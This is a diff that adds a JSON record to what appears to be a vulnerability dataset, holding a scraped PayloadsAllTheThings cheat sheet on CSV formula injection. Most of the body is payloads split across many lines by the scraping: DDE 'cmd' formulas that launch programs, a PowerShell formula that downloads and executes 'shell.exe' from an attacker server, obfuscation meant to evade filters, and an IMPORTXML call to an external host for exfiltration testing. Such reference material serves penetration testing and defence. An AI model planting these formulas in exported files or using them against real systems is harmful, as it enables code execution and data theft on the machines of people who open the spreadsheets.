@@ -1,0 +1,20 @@
+{
+  "id": "4abefdccb1f5",
+  "source": "payloads",
+  "title": "PayloadsAllTheThings: CSV Injection",
+  "url": "https://swisskyrepo.github.io/PayloadsAllTheThings/CSV%20Injection/",
+  "scraped_at": "2026-03-15T23:07:56.681712",
+  "severity": "medium",
+  "vuln_type": "CSV Injection",
+  "cwe": "CWE-1236",
+  "cvss_score": null,
+  "affected_component": null,
+  "description": "CSV Injection\nMany web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.\nSummary\nMethodology\nGoogle Sheets\nReferences\nMethodology\nCSV Injection, also known as Formula Injection, is a security vulnerability th",
+  "body": "CSV Injection\nMany web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.\nSummary\nMethodology\nGoogle Sheets\nReferences\nMethodology\nCSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with:\n=\n+\n–\n@\nBasic exploits with\nDynamic Data Exchange\n.\nSpawn a calc\nDDE\n(\n\"cmd\"\n;\n\"/C calc\"\n;\n\"!A0\"\n)\nA0\n@SUM\n(\n1\n+\n1\n)*\ncmd\n|\n' /C calc'\n!\nA0\n=\n2\n+\n5\n+\ncmd\n|\n' /C calc'\n!\nA0\n=\ncmd\n|\n' /C calc'\n!\n'A1'\nPowerShell download and execute\n=\ncmd\n|\n'/C powershell IEX(wget attacker_server/shell.exe)'\n!\nA0\nPrefix obfuscation and command chaining\n=\nAAAA\n+\nBBBB-CCCC\n&\n\"Hello\"\n/\n12345\n&\ncmd\n|\n'/c calc.exe'\n!\nA\n=\ncmd\n|\n'/c calc.exe'\n!\nA\n*\ncmd\n|\n'/c calc.exe'\n!\nA\n=\ncmd\n|\n'/c calc.exe'\n!\nA\nUsing rundll32 instead of cmd\n=\nrundll32\n|\n'URL.dll,OpenURL calc.exe'\n!\nA\n=\nrundll321234567890abcdefghijklmnopqrstuvwxyz\n|\n'URL.dll,OpenURL calc.exe'\n!\nA\nUsing null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.\n=\nC\nm\nD\n|\n'/        c       c  al  c      .  e                  x       e  '\n!\nA\nTechnical details of the above payloads:\ncmd\nis the name the server can respond to whenever a client is trying to access the server\n/C\ncalc is the file name which in our case is the calc(i.e the calc.exe)\n!A0\nis the item name that specifies unit of data that a server can respond when the client is requesting the data\nGoogle Sheets\nGoogle Sheets allows some additional formulas that are able to fetch remote URLs:\nIMPORTXML\n(url, xpath_query, locale)\nIMPORTRANGE\n(spreadsheet_url, range_string)\nIMPORTHTML\n(url, query, index)\nIMPORTFEED\n(url, [query], [headers], [num_items])\nIMPORTDATA\n(url)\nSo one can test blind formula injection or a potential for data exfiltration with:\n=\nIMPORTXML\n(\n\"http://burp.collaborator.net/csv\"\n,\n\"//a/@href\"\n)\nNote: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.\nReferences\nCSV Excel Macro Injection - Timo Goosen, Albinowax - Jun 21, 2022\nCSV Excel formula injection - Google Bug Hunter University - May 22, 2022\nCSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - 30/11/2017\nFrom CSV to Meterpreter - Adam Chester - November 05, 2015\nThe Absurdly Underestimated Dangers of CSV Injection - George Mauer - 7 October, 2017\nThree New DDE Obfuscation Methods - ReversingLabs - September 24, 2018\nYour Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - October 5, 2020\nShare this content\nBack to top",
+  "bounty": null,
+  "disclosed_at": null,
+  "metadata": {
+    "category": "CSV Injection",
+    "source_repo": "swisskyrepo/PayloadsAllTheThings"
+  }
+}
